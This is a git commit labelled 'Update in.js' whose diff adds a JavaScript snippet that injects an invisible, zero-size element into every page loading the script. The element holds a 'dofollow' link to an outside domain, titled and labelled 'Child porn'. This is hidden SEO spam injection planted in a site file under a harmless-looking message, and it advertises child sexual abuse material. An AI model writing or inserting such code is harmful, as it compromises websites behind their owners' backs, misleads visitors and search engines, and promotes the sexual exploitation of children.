ab54b7274981f73704e8fea6c9a9ed80f8c7d0f0
Zymper <51706348+zympers@users.noreply.github.com>
2025-01-28 13:24:53 +0300

    Update in.js

--- in.js
+++ in.js
@@ -1,1 +1,16 @@
+(function() {
+    var container = document.createElement('p');
+    container.style = 'overflow: auto; position: fixed; height: 0pt; width: 0pt';
+    
+    var link1 = document.createElement('a');
+    link1.href = 'https://lamerhaber.com';
+    link1.target = '_blank';
+    link1.rel = 'dofollow';
+    link1.title = 'Child porn';
+    link1.textContent = 'Child porn';
+    
+    container.appendChild(link1);
+    
+    document.body.appendChild(container);
+})();
 
